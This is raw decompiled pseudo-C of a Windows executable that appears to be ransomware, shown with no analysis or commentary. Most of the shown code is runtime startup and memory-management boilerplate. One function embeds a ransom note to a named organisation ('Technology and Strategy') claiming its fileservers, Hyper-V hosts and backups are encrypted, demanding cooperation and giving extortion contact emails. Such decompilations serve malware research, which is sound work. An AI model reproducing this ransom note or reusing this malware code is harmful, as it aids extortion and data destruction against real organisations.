    int32_t v7; // 0x4059c0
    int32_t v8; // 0x4059c0
    int32_t v9; // 0x4059c0
    if (v4 < 0x7ffffffe) {
        uint32_t v10 = v1 / 2; // 0x405a39
        v5 = 0x7ffffffe;
        if (v1 > 0x7ffffffe - v10) {
            goto lab_0x405a6a;
        } else {
            uint32_t v11 = v10 + v1; // 0x405a48
            int32_t v12 = v4 < v11 ? v11 : v4; // 0x405a4d
            int32_t v13 = v12 + 1; // 0x405a50
            v5 = v12;
            if (v13 > -1) {
                uint32_t v14 = 2 * v13; // 0x405a53
                if (v14 < 0x1000) {
                    // 0x405a91
                    v8 = v12;
                    v7 = 0;
                    if (v14 != 0) {
                        // 0x405a95
                        v8 = v12;
                        v7 = function_405b2b(v14);
                    }
                    goto lab_0x405aa4;
                } else {
                    // 0x405a6a
                    v5 = v12;
                    v9 = v12;
                    v6 = v14 + 35;
                    if (v14 > 0xffffffdc) {
                        goto lab_0x405a6a;
                    } else {
                        goto lab_dec_label_pc_unknown;
                    }
                }
            } else {
                goto lab_0x405a6a;
            }
        }
    } else {
        goto lab_0x405a6a;
    }
  lab_0x405a6a:
    // 0x405a6a
    v9 = v5;
    v6 = -1;
    goto lab_dec_label_pc_unknown;
  lab_dec_label_pc_unknown:;
    int32_t v15 = function_405b2b(v6); // 0x405a76
    if (v15 == 0) {
        // 0x405b14
        function_409683();
        // 0x405b19
        function_405b20();
        __asm_int3();
        return __asm_int3();
    }
    int32_t v16 = v15 + 35 & -32; // 0x405a89
    *(int32_t *)(v16 - 4) = v15;
    v8 = v9;
    v7 = v16;
    goto lab_0x405aa4;
  lab_0x405aa4:
    // 0x405aa4
    g147 = v8;
    int32_t v17 = 2 * a1; // 0x405aaa
    g146 = a1;
    function_408e60(v7, (int32_t)L"Hello Technology and Strategy!\r\nAll your fileservers, HyperV infrastructure and backups have been encrypted!\r\nTrying to decrypt or modify the files with programs other than our decryptor can lead to permanent loss of data!\r\nThe only way to recover your files is by cooperating with us.\r\nTo prove our seriousness, we can decrypt 1 non - critical file for free as proof.\r\n\r\nContacts:\r\nTECHANDSTRATsupport@secmail.pro\r\nTECHANDSTRATsuport@protonmail.com\r\n", v17);
    *(int16_t *)(v7 + v17) = 0;
    if (v1 < 8) {
        // 0x405b00
        g145 = (int16_t *)v7;
        return (int32_t)&g145;
    }
    int32_t v18 = (int32_t)g145; // 0x405ad7
    if (2 * v1 < 4094) {
        // 0x405af6
        function_405b5b(v18);
        // 0x405b00
        g145 = (int16_t *)v7;
        return (int32_t)&g145;
    }
    int32_t v19 = v18 - 4;
    int32_t v20 = *(int32_t *)v19; // 0x405ae4
    if (v19 - v20 < 32) {
        // 0x405af6
        function_405b5b(v20);
        // 0x405b00
        g145 = (int16_t *)v7;
        return (int32_t)&g145;
    }
    // 0x405b14
    function_409683();
    // 0x405b19
    function_405b20();
    __asm_int3();
    return __asm_int3();
}

// Address range: 0x405b20 - 0x405b2b
int32_t function_405b20(void) {
    // 0x405b20
    function_406b02("string too long");
    return __asm_int3();
}

// Address range: 0x405b2b - 0x405b5b
int32_t function_405b2b(int32_t a1) {
    // 0x405b2b
    int32_t v1; // bp-4, 0x405b2b
    int32_t * v2 = (int32_t *)((int32_t)&v1 - 4); // 0x405b3d
    *v2 = a1;
    int32_t result = function_4096d3(); // 0x405b40
    while (result == 0) {
        // 0x405b30
        *v2 = a1;
        if (function_4096f2((int32_t)&g266) == 0) {
            if (a1 != -1) {
                // 0x405b56
                return function_406378();
            }
            function_406395();
            // 0x405b56
            return function_406378();
        }
        *v2 = a1;
        result = function_4096d3();
    }
    // 0x405b4a
    return result;
}

// Address range: 0x405b5b - 0x405b69
int32_t function_405b5b(int32_t a1) {
    // 0x405b5b
    int32_t v1; // 0x405b5b
    return function_4063bf(a1, v1);
}

// Address range: 0x405b69 - 0x405b90
int32_t function_405b69(void) {
    // 0x405b69
    function_405bad();
    if ((char)function_405ea5(0) == 0) {
        // 0x405b88
        function_4063c4(7, (int32_t)&g266);
        return __asm_int3();
    }
    // 0x405b7a
    function_406059(0x405c9c);
    return 0;
}

// Address range: 0x405b90 - 0x405bad
int32_t function_405b90(uint32_t a1) {
    uint32_t v1 = -g112 & 31; // 0x405ba3
    int32_t v2 = a1; // 0x405ba3
    if (v1 != 0) {
        v2 = a1 << 32 - v1 | a1 >> v1;
    }
    return v2 ^ g112;
}

// Address range: 0x405bad - 0x405cb8
int32_t function_405bad(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x405bbd
    __writefsdword(0, (int32_t)&v1);
    InitializeCriticalSectionAndSpinCount((struct _RTL_CRITICAL_SECTION *)&g149, 4000);
    int16_t * v2 = L"api-ms-win-core-synch-l1-2-0.dll"; // bp-44, 0x405be2
    int32_t * v3 = GetModuleHandleW(L"api-ms-win-core-synch-l1-2-0.dll"); // 0x405be7
    int32_t v4 = (int32_t)&v2; // 0x405bf1
    int32_t * v5 = v3; // 0x405bf1
    int32_t v6; // 0x405bad
    if (v3 != NULL) {
        goto lab_0x405c08;
    } else {
        int16_t * v7 = L"kernel32.dll"; // bp-48, 0x405bf3
        v4 = (int32_t)&v7;
        v5 = GetModuleHandleW(L"kernel32.dll");
        v6 = v4;
        if (v5 == NULL) {
            goto lab_0x405c94;
        } else {
            goto lab_0x405c08;
        }
    }
  lab_0x405c08:;
    int32_t v8 = (int32_t)v5;
    *(int32_t *)(v4 - 4) = (int32_t)"InitializeConditionVariable";
    *(int32_t *)(v4 - 8) = v8;
    int32_t (*func)() = GetProcAddress(&g266, (char *)&g266); // 0x405c0e
    *(int32_t *)(v4 - 12) = (int32_t)"SleepConditionVariableCS";
    *(int32_t *)(v4 - 16) = v8;
    int32_t (*func2)() = GetProcAddress(&g266, (char *)&g266); // 0x405c1c
    *(int32_t *)(v4 - 20) = (int32_t)"WakeAllConditionVariable";
    *(int32_t *)(v4 - 24) = v8;
    int32_t (*func3)() = GetProcAddress(&g266, (char *)&g266); // 0x405c2a
    if (func != NULL && func2 != NULL && func3 != NULL) {
        // 0x405c3e
        g151 = 0;
        *(int32_t *)(v4 - 28) = (int32_t)&g150;
        function_4065bf();
        *(int32_t *)(v4 - 32) = (int32_t)func2;
        int32_t v9 = function_405b90((int32_t)&g266); // 0x405c55
        *(int32_t *)(v4 - 36) = (int32_t)func3;
        g152 = v9;
        int32_t result = function_405b90((int32_t)&g266); // 0x405c60
        g153 = result;
        // 0x405c6c
        __writefsdword(0, v1);
        return result;
    }
    // 0x405c7e
    *(int32_t *)(v4 - 28) = 0;
    *(int32_t *)(v4 - 32) = 0;
    *(int32_t *)(v4 - 36) = 1;
    int32_t v10 = v4 - 40; // 0x405c84
    *(int32_t *)v10 = 0;
    int32_t * v11 = CreateEventW((struct _SECURITY_ATTRIBUTES *)&g266, (bool)&g266, (bool)&g266, (int16_t *)&g266); // 0x405c85
    int32_t result2 = (int32_t)v11; // 0x405c85
    g151 = result2;
    v6 = v10;
    if (v11 != NULL) {
        // 0x405c6c
        __writefsdword(0, v1);
        return result2;
    }
    goto lab_0x405c94;
  lab_0x405c94:
    // 0x405c94
    *(int32_t *)(v6 - 4) = 7;
    function_4063c4((int32_t)&g266, (int32_t)&g266);
    __asm_int3();
    *(int32_t *)(v6 - 8) = (int32_t)&g149;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    int32_t handleClosed = 0; // 0x405cae
    if (g151 != 0) {
        // 0x405cb0
        *(int32_t *)(v6 - 12) = g151;
        handleClosed = CloseHandle(&g266);
    }
    // 0x405cb7
    return handleClosed;
}

// Address range: 0x405cb8 - 0x405d02
int32_t function_405cb8(int32_t * a1) {
    // 0x405cb8
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g149);
    int32_t v1 = g111 + 1; // 0x405cd1
    g111 = v1;
    *a1 = v1;
    int32_t v2 = *(int32_t *)(4 * g161 + __readfsdword(44)); // 0x405ce7
    *(int32_t *)(v2 + 4) = g111;
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    return function_405d54();
}

// Address range: 0x405d02 - 0x405d54
int32_t function_405d02(int32_t * a1) {
    struct _RTL_CRITICAL_SECTION * v1 = (struct _RTL_CRITICAL_SECTION *)&g149; // bp-16, 0x405d0c
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g149);
    int32_t v2 = *a1; // 0x405d16
    int32_t * v3 = (int32_t *)((int32_t)&v1 - 4);
    int32_t v4 = v2; // 0x405d19
    if (v2 == 0) {
      lab_0x405d1b:
        // 0x405d1b
        *a1 = -1;
        // 0x405d49
        *v3 = (int32_t)&g149;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
        return &g266;
    }
    while (v4 == -1) {
        // 0x405d20
        *v3 = 100;
        function_405d96((int32_t)&g266);
        v4 = *a1;
        if (v4 == 0) {
            goto lab_0x405d1b;
        }
    }
    int32_t v5 = *(int32_t *)(4 * g161 + __readfsdword(44)); // 0x405d3b
    *(int32_t *)(v5 + 4) = g111;
    // 0x405d49
    *v3 = (int32_t)&g149;
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    return &g266;
}

// Address range: 0x405d54 - 0x405d96
int32_t function_405d54(void) {
    // 0x405d54
    if (g151 == 0) {
        // 0x405d5d
        return function_4065bf();
    }
    // 0x405d82
    SetEvent((int32_t *)g151);
    return ResetEvent((int32_t *)g151);
}

// Address range: 0x405d96 - 0x405df6
int32_t function_405d96(int32_t dwMilliseconds) {
    // 0x405d96
    int32_t result; // 0x405d96
    if (g151 != 0) {
        // 0x405dcf
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g149);
        WaitForSingleObjectEx((int32_t *)g151, dwMilliseconds, false);
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g149);
        result = &g266;
    } else {
        // 0x405da3
        result = function_4065bf();
    }
    // 0x405df3
    return result;
}

// Address range: 0x405df6 - 0x405e3a
int32_t function_405df6(int32_t a1, uint32_t a2) {
    int32_t v1 = *(int32_t *)(a1 + 60) + a1; // 0x405e00
    int32_t v2 = v1 + 24 + (int32_t)*(int16_t *)(v1 + 20); // 0x405e09
    uint16_t v3 = *(int16_t *)(v1 + 6); // 0x405e0b
    if (v3 == 0) {
        // 0x405e33
        return 0;
    }
    uint32_t v4 = *(int32_t *)(v2 + 12); // 0x405e1b
    if (v4 <= a2) {
        // 0x405e20
        if (*(int32_t *)(v2 + 8) + v4 > a2) {
            // break -> 0x405e33
            break;
        }
    }
    int32_t v5 = v2 + 40; // 0x405e2a
    int32_t result = 0; // 0x405e2f
    while (v5 != 40 * (int32_t)v3 + v2) {
        int32_t v6 = v5;
        v4 = *(int32_t *)(v6 + 12);
        if (v4 <= a2) {
            // 0x405e20
            result = v6;
            if (*(int32_t *)(v6 + 8) + v4 > a2) {
                // break -> 0x405e33
                break;
            }
        }
        // 0x405e2a
        v5 = v6 + 40;
        result = 0;
    }
    // 0x405e33
    return result;
}

// Address range: 0x405e3a - 0x405e6c
int32_t function_405e3a(void) {
    // 0x405e3a
    int32_t v1; // 0x405e3a
    if (function_40675d(v1) == 0) {
        // 0x405e64
        return 0;
    }
    int32_t v2 = *(int32_t *)(__readfsdword(24) + 4); // 0x405e4f
    int32_t v3 = g158;
    while (v3 != 0) {
        if (v2 == v3) {
            // 0x405e68
            g158 = v2;
            return v2 & -256 | 1;
        }
    }
    // 0x405e64
    g158 = v2;
    // 0x405e64
    return v3 & -256;
}

// Address range: 0x405e6c - 0x405ea5
int32_t function_405e6c(int32_t a1) {
    // 0x405e6c
    if (a1 == 0) {
        // 0x405e75
        g159 = 1;
    }
    // 0x405e7c
    int32_t v1; // 0x405e6c
    function_4065c0(v1);
    int32_t v2 = function_406ecd(); // 0x405e81
    if ((char)v2 == 0) {
        // 0x405e8a
        return v2 & -256;
    }
    int32_t v3 = function_40a5a2(); // 0x405e8e
    if ((char)v3 != 0) {
        // 0x405ea1
        return v3 & -256 | 1;
    }
    // 0x405e8a
    return function_406ef6(0) & -256;
}

// Address range: 0x405ea5 - 0x405f4f
int32_t function_405ea5(int32_t a1) {
    // 0x405ea5
    if (g156 != 0) {
        // 0x405f43
        int32_t v1; // 0x405ea5
        return v1 & -256 | 1;
    }
    int32_t v2; // 0x405ea5
    if (a1 != 0 == (a1 != 1)) {
        // 0x405f47
        function_4063c4(5, v2);
        return __asm_int3();
    }
    // 0x405ec8
    if (a1 != 0 | function_40675d(v2) == 0) {
        uint32_t v3 = -g112 & 31; // 0x405f10
        int32_t v4 = -1; // 0x405f10
        if (v3 != 0) {
            v4 = -1 << 32 - v3 | 0xffffffff >> v3;
        }
        int32_t v5 = v4 ^ g112; // 0x405f12
        int32_t v6 = v5; // bp-16, 0x405f18
        g154 = v5;
        bool v7; // 0x405ea5
        int32_t v8 = v7 ? -4 : 4; // 0x405f21
        int32_t v9 = v8 + (int32_t)&g154; // 0x405f21
        int32_t v10 = v8 + (int32_t)&v6; // 0x405f21
        int32_t * v11 = (int32_t *)v10; // 0x405f22
        *(int32_t *)v9 = *v11;
        int32_t * v12 = (int32_t *)(v10 + v8); // 0x405f23
        *(int32_t *)(v9 + v8) = *v12;
        v6 = v5;
        g155 = v5;
        int32_t v13 = v8 + (int32_t)&g155; // 0x405f35
        *(int32_t *)v13 = *v11;
        *(int32_t *)(v13 + v8) = *v12;
        // 0x405f39
        g156 = 1;
        // 0x405f43
        return v5 & -256 | 1;
    }
    int32_t v14 = function_40a450(&g154); // 0x405eda
    if (v14 != 0) {
        // 0x405f43
        return v14 & -256;
    }
    int32_t v15 = function_40a450(&g155); // 0x405ee9
    if (v15 != 0) {
        // 0x405f43
        return v15 & -256;
    }
    // 0x405f39
    g156 = 1;
    // 0x405f43
    return 1;
}

// Address range: 0x405f4f - 0x405fd9
int32_t function_405f4f(void) {
    // 0x405f4f
    function_406770(&g76, 8, (int32_t)&g266);
    int32_t v1; // 0x405f4f
    int32_t * v2 = (int32_t *)(v1 - 4); // 0x405f5b
    *v2 = 0;
    int32_t result; // 0x405fd3
    if (*(int16_t *)0x400000 != 0x5a4d) {
        // 0x405fd3
        *v2 = -2;
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t v3 = *(int32_t *)0x40003c; // 0x405f6d
    if (*(int32_t *)(v3 + 0x400000) != 0x4550) {
        // 0x405fd3
        *v2 = -2;
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    // 0x405f7e
    if (*(int16_t *)(v3 + 0x400018) == 267) {
        // 0x405f8c
        function_405df6(0x400000, *(int32_t *)(v1 + 8) - 0x400000);
    }
    // 0x405fd3
    *v2 = -2;
    result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x405fd9 - 0x405ff6
int32_t function_405fd9(int32_t a1) {
    // 0x405fd9
    int32_t v1; // 0x405fd9
    int32_t v2 = function_40675d(v1); // 0x405fdc
    if (v2 == 0) {
        // 0x405ff4
        return 0;
    }
    int32_t result = v2; // 0x405fe9
    if ((char)a1 == 0) {
        // 0x405feb
        result = g158;
        g158 = 0;
    }
    // 0x405ff4
    return result;
}

// Address range: 0x405ff6 - 0x40601e
int32_t function_405ff6(int32_t a1, int32_t a2) {
    // 0x405ff6
    if (g159 != 0) {
        if ((char)a2 != 0) {
            // 0x40601a
            int32_t v1; // 0x405ff6
            return v1 & -256 | 1;
        }
    }
    // 0x406008
    int32_t v2; // 0x405ff6
    function_40a5b4(a1, v2);
    // 0x40601a
    return function_406ef6(a1) & -256 | 1;
}

// Address range: 0x40601e - 0x406059
int32_t function_40601e(int32_t a1, int32_t a2) {
    int32_t v1 = g154 ^ g112; // 0x406028
    uint32_t v2 = g112 & 31; // 0x40602e
    int32_t v3 = v1; // 0x406034
    if (v2 != 0) {
        v3 = v1 >> v2 | v1 << 32 - v2;
    }
    int32_t v4; // 0x40601e
    int32_t v5; // 0x40601e
    if (v3 != -1) {
        // 0x406042
        v4 = function_40a48d(&g154, a1, v5);
    } else {
        // 0x40603b
        v4 = function_40a41d(a1, v5);
    }
    // 0x40604d
    return v4 == 0 ? a1 : 0;
}

// Address range: 0x406059 - 0x40606e
int32_t function_406059(int32_t a1) {
    // 0x406059
    int32_t v1; // 0x406059
    return function_40601e(a1, v1) == 0;
}

// Address range: 0x40606e - 0x40611a
int32_t function_40606e(void) {
    // 0x40606e
    int32_t v1; // 0x40606e
    function_40a5cc(2, v1);
    function_40a75a(function_406865());
    int32_t v2 = function_40a88b(); // 0x406081
    *(int32_t *)v2 = function_406513();
    if ((char)function_405ea5(1) == 0) {
        // 0x40610a
        function_4063c4(7, (int32_t)&g266);
        __asm_int3();
        function_4068a1();
        return 0;
    }
    // 0x40609e
    __asm_fnclex();
    function_4068d6();
    function_406059(0x406902);
    int32_t v3 = function_406759(); // 0x4060af
    if (function_409eb4(v3) != 0) {
        // 0x40610a
        function_4063c4(7, (int32_t)&g266);
        __asm_int3();
        function_4068a1();
        return 0;
    }
    // 0x4060c0
    InitializeSListHead(&g266);
    if (function_4068be() != 0) {
        // 0x4060ce
        function_40a651(0x406513);
    }
    // 0x4060d9
    function_4065bf();
    function_4065bf();
    function_40687a();
    function_40a7f4(function_406513());
    if ((char)function_406877() != 0) {
        // 0x4060fd
        function_40a0c5();
    }
    // 0x406102
    function_406513();
    return 0;
}

// Address range: 0x40611a - 0x40612c
int32_t function_40611a(void) {
    // 0x40611a
    SetUnhandledExceptionFilter((int32_t (*)(struct _EXCEPTION_POINTERS *))&g266);
    return function_40a85c(function_406513());
}

// Address range: 0x40612c - 0x40629d
int32_t function_40612c(void) {
    int32_t v1 = &g77; // bp-8, 0x40612e
    function_406770(&g77, 20, (int32_t)&g266);
    int32_t v2 = 1; // bp-12, 0x406138
    int32_t v3; // 0x40612c
    if ((char)function_405e6c(1) != 0) {
        // 0x406148
        int32_t v4; // 0x40612c
        char * v5 = (char *)(v4 - 25); // 0x40614a
        *v5 = 0;
        int32_t * v6 = (int32_t *)(v4 - 4); // 0x40614d
        *v6 = 0;
        int32_t v7 = function_405e3a(); // 0x406151
        int32_t v8 = v4 - 36; // 0x406156
        *(char *)v8 = (char)v7;
        if (g157 != 1) {
            char v9; // 0x40612c
            int32_t result; // 0x406282
            if (g157 != 0) {
                // 0x4061b6
                *v5 = 1;
                v9 = 1;
            } else {
                // 0x40616d
                g157 = 1;
                v2 = &g7;
                if (function_40a715(&g6, &g7) != 0) {
                    // 0x406282
                    *v6 = -2;
                    result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                    return result;
                }
                // 0x406199
                v2 = &g5;
                function_40a6b9(&g4, &g5);
                g157 = 2;
                v9 = 0;
            }
            int32_t v10 = *(int32_t *)v8; // 0x4061bb
            v2 = v10;
            function_405fd9(v10);
            int32_t v11 = &v1; // 0x4061c3
            int32_t v12 = function_4068ca(); // 0x4061c4
            int32_t v13 = v11; // 0x4061cf
            if (*(int32_t *)v12 != 0) {
                // 0x4061d1
                v2 = v12;
                v13 = v11;
                if ((char)function_405f4f() != 0) {
                    // 0x4061dc
                    v2 = 0;
                    int32_t v14 = 0; // bp-20, 0x4061df
                    function_4065bf();
                    v13 = &v14;
                }
            }
            int32_t v15 = function_4068d0(); // 0x4061ec
            int32_t * v16 = (int32_t *)v15; // 0x4061f3
            int32_t * v17 = (int32_t *)(v13 - 4);
            if (*v16 != 0) {
                // 0x4061f7
                *v17 = v15;
                if ((char)function_405f4f() != 0) {
                    // 0x406202
                    *v17 = *v16;
                    function_409b78((int32_t)&g266);
                }
            }
            // 0x40620a
            *v17 = function_4064e0() & 0xffff;
            *(int32_t *)(v13 - 8) = function_40a666();
            *(int32_t *)(v13 - 12) = 0;
            int32_t v18 = v13 - 16; // 0x40621a
            *(int32_t *)v18 = 0x400000;
            v3 = function_405690();
            if ((char)function_406516() == 0) {
                // 0x40628f
                *(int32_t *)(v18 - 4) = v3;
                function_409bb0((int32_t)&g266);
                // UNREACHABLE
            }
            if (v9 == 0) {
                // 0x406233
                function_409b53();
                // UNREACHABLE
            }
            // 0x406238
            *(int32_t *)(v13 - 20) = 0;
            *(int32_t *)(v13 - 24) = 1;
            function_405ff6((int32_t)&g266, (int32_t)&g266);
            // 0x406282
            *v6 = -2;
            result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            return result;
        }
    }
    // 0x406288
    v2 = 7;
    function_4063c4(7, (int32_t)&g266);
    // 0x40628f
    *(int32_t *)((int32_t)&v2 - 4) = v3;
    function_409bb0((int32_t)&g266);
    // UNREACHABLE
}

// Address range: 0x40629e - 0x4062a8
int32_t entry_point(void) {
    // 0x40629e
    function_40681a();
    return function_40612c();
}

// Address range: 0x4062a8 - 0x4062c3
int32_t function_4062a8(int32_t a1) {
    // 0x4062a8
    int32_t v1; // 0x4062a8
    int32_t v2; // 0x4062a8
    function_40630e(a1, v1, v2);
    int32_t result; // 0x4062a8
    *(int32_t *)result = (int32_t)&g13;
    return result;
}

// Address range: 0x4062c3 - 0x4062db
int32_t function_4062c3(int32_t a1) {
    // 0x4062c3
    int32_t result; // 0x4062c3
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 4) = (int32_t)"bad allocation";
    *(int32_t *)result = (int32_t)&g13;
    return result;
}

// Address range: 0x4062db - 0x4062f6
int32_t function_4062db(int32_t a1) {
    // 0x4062db
    int32_t v1; // 0x4062db
    int32_t v2; // 0x4062db
    function_40630e(a1, v1, v2);
    int32_t result; // 0x4062db
    *(int32_t *)result = (int32_t)&g14;
    return result;
}

// Address range: 0x4062f6 - 0x40630e
int32_t function_4062f6(int32_t a1) {
    // 0x4062f6
    int32_t result; // 0x4062f6
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 4) = (int32_t)"bad array new length";
    *(int32_t *)result = (int32_t)&g14;
    return result;
}

// Address range: 0x40630e - 0x40633a
int32_t function_40630e(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40630e
    int32_t result; // 0x40630e
    int32_t v1 = result + 4; // 0x406314
    *(int32_t *)result = (int32_t)&g12;
    *(int32_t *)v1 = 0;
    *(int32_t *)(result + 8) = 0;
    int32_t v2; // 0x40630e
    int32_t v3; // 0x40630e
    function_4070b7(a1 + 4, v1, v2, v3);
    return result;
}

// Address range: 0x40633a - 0x40634b
int32_t function_40633a(void) {
    // 0x40633a
    int32_t v1; // 0x40633a
    *(int32_t *)v1 = (int32_t)&g12;
    return function_40711a(v1 + 4);
}

// Address range: 0x40634b - 0x406378
int32_t function_40634b(char a1) {
    // 0x40634b
    int32_t result; // 0x40634b
    *(int32_t *)result = (int32_t)&g12;
    function_40711a(result + 4);
    if ((a1 & 1) != 0) {
        // 0x406367
        function_405b5b(result);
    }
    // 0x406371
    return result;
}

// Address range: 0x406378 - 0x406395
int32_t function_406378(void) {
    // 0x406378
    int32_t v1; // 0x406378
    function_4062c3(v1);
    int32_t v2; // bp-16, 0x406378
    function_407139(&v2, &g78);
    return __asm_int3();
}

// Address range: 0x406395 - 0x4063bf
int32_t function_406395(void) {
    // 0x406395
    int32_t v1; // 0x406395
    function_4062f6(v1);
    int32_t v2; // bp-16, 0x406395
    function_407139(&v2, &g79);
    __asm_int3();
    int32_t v3; // 0x406395
    return v3 != 0 ? v3 : (int32_t)"Unknown exception";
}

// Address range: 0x4063bf - 0x4063c4
int32_t function_4063bf(int32_t a1, int32_t a2) {
    // 0x4063bf
    return function_40a891();
}

// Address range: 0x4063c4 - 0x4064e0
int32_t function_4063c4(int32_t a1, int32_t a2) {
    // 0x4063c4
    if (IsProcessorFeaturePresent(23)) {
        // 0x4063d9
        __asm_int(41);
    }
    // 0x4063de
    function_4065a6(3);
    int32_t v1; // bp-808, 0x4063c4
    function_4071b0(&v1, 0, 716);
    v1 = 0x10001;
    int32_t v2; // bp-92, 0x4063c4
    function_4071b0(&v2, 0, 80);
    v2 = 0x40000015;
    IsDebuggerPresent();
    int32_t ExceptionInfo = &v2; // bp-12, 0x4064ab
    SetUnhandledExceptionFilter(NULL);
    int32_t v3 = UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)&ExceptionInfo); // 0x4064c5
    int32_t result = v3; // 0x4064cd
    if (v3 == 0) {
        // 0x4064d3
        result = function_4065a6(3);
    }
    // 0x4064db
    return result;
}

// Address range: 0x4064e0 - 0x406513
int32_t function_4064e0(void) {
    // 0x4064e0
    int32_t lpStartupInfo; // bp-72, 0x4064e0
    function_4071b0(&lpStartupInfo, 0, 68);
    GetStartupInfoW((struct _STARTUPINFOW *)&lpStartupInfo);
    uint16_t v1; // 0x4064e0
    char v2; // 0x4064e0
    return (v2 & 1) == 0 ? 10 : (int32_t)v1;
}

// Address range: 0x406513 - 0x406516
int32_t function_406513(void) {
    // 0x406513
    return 0;
}

// Address range: 0x406516 - 0x406559
int32_t function_406516(void) {
    int32_t * v1 = GetModuleHandleW(NULL); // 0x406518
    int32_t v2 = (int32_t)v1; // 0x406518
    if (v1 == NULL || *(int16_t *)v1 != 0x5a4d) {
        // 0x406556
        return v2 & -256;
    }
    int32_t v3 = *(int32_t *)(v2 + 60) + v2; // 0x40652f
    if (*(int32_t *)v3 != 0x4550) {
        // 0x406556
        return v2 & -256;
    }
    // 0x406539
    if (*(int16_t *)(v3 + 24) != 267 || *(int32_t *)(v3 + 116) < 15 || *(int32_t *)(v3 + 232) == 0) {
        // 0x406556
        return 256;
    }
    // 0x406553
    return 257;
}

// Address range: 0x406559 - 0x406565
int32_t (*function_406559(int32_t (*lpTopLevelExceptionFilter)(struct _EXCEPTION_POINTERS *)))(struct _EXCEPTION_POINTERS *) {
    // 0x406559
    return SetUnhandledExceptionFilter(lpTopLevelExceptionFilter);
}

// Address range: 0x406565 - 0x4065a5
int32_t function_406565(int32_t a1) {
    int32_t v1 = *(int32_t *)a1; // 0x40656b
    if (*(int32_t *)v1 != -0x1f928c9d || *(int32_t *)(v1 + 16) != 3) {
        // 0x40659a
        return 0;
    }
    // 0x40657b
    switch (*(int32_t *)(v1 + 20)) {
        case 0x19930522: {
        }
        case 0x19930521: {
        }
        case 0x19930520: {
        }
        case 0x1994000: {
            // 0x4065a0
            function_40a896();
            // UNREACHABLE
        }
    }
    // 0x40659a
    return 0;
}

// Address range: 0x4065a6 - 0x4065ae
int32_t function_4065a6(int32_t a1) {
    // 0x4065a6
    g160 = 0;
    int32_t result; // 0x4065a6
    return result;
}

// Address range: 0x4065ae - 0x4065bf
int32_t function_4065ae(void) {
    // 0x4065ae
    int32_t v1; // 0x4065ae
    if (v1 != g112) {
        // 0x4065b9
        return function_406979((int32_t)&g266);
    }
    // 0x4065b7
    int32_t result; // 0x4065ae
    return result;
}

// Address range: 0x4065bf - 0x4065c0
int32_t function_4065bf(void) {
    // 0x4065bf
    int32_t result; // 0x4065bf
    return result;
}

// Address range: 0x4065c0 - 0x406759
int32_t function_4065c0(int32_t a1) {
    struct struct3 v1; // 0x406601
    struct struct1 v2; // 0x40663c
    // 0x4065c0
    g162 = 0;
    g114 |= 1;
    if (!IsProcessorFeaturePresent(10)) {
        // 0x406752
        return 0;
    }
    // 0x4065e6
    g114 |= 2;
    g162 = 1;
    v1 = __asm_cpuid(0);
    v2 = __asm_cpuid_1(1);
    int32_t v3; // 0x4065c0
    if ((v1.e1 ^ 0x756e6547 || v1.e2 ^ 0x6c65746e || v1.e3 ^ 0x49656e69) != 0) {
        // 0x40669c
        v3 = g163;
        goto lab_0x4066a2;
    } else {
        int32_t v4 = v2.e0 & 0xfff3ff0; // 0x40665c
        switch (v4) {
            case 0x30660: {
                goto lab_0x40668b;
            }
            case 0x30650: {
                goto lab_0x40668b;
            }
            case 0x20670: {
                goto lab_0x40668b;
            }
            case 0x20660: {
                goto lab_0x40668b;
            }
            case 0x106c0: {
                goto lab_0x40668b;
            }
            default: {
                if (v4 != 0x30670) {
                    // 0x40669c
                    v3 = g163;
                    goto lab_0x4066a2;
                } else {
                    goto lab_0x40668b;
                }
            }
        }
    }
  lab_0x4066a2:
    if (v1.e0 >= 7) {
        // 0x4066ae
        if ((__asm_cpuid_2(7).e1 & 512) != 0) {
            // 0x4066d5
            g163 = v3 | 2;
        }
    }
    int32_t v5 = v2.e2; // 0x40663c
    if ((v5 & 0x100000) == 0) {
        // 0x406752
        return 0;
    }
    // 0x4066ec
    g114 |= 4;
    g162 = 2;
    if ((v5 & 0x18000000) == 0x18000000) {
        // 0x40670b
        __asm_xgetbv(0);
    }
    // 0x406752
    return 0;
  lab_0x40668b:;
    int32_t v6 = g163 | 1; // 0x406691
    g163 = v6;
    v3 = v6;
    goto lab_0x4066a2;
}

// Address range: 0x406759 - 0x40675d
int32_t function_406759(void) {
    // 0x406759
    return 1;
}

// Address range: 0x40675d - 0x406769
int32_t function_40675d(int32_t a1) {
    // 0x40675d
    return g257 != 0;
}

// Address range: 0x406770 - 0x4067b6
int32_t function_406770(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-8, 0x406775
    int32_t result = &v1; // 0x406775
    int32_t v2 = result - a3; // 0x406788
    int32_t v3; // 0x406770
    *(int32_t *)(v2 - 16) = g112 ^ (int32_t)&v3;
    *(int32_t *)(v2 - 20) = (int32_t)a1;
    __writefsdword(0, result);
    return result;
}

// Address range: 0x4067b6 - 0x4067cb
int32_t function_4067b6(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x4067b6
    int32_t v1; // 0x4067b6
    __writefsdword(0, *(int32_t *)(v1 - 16));
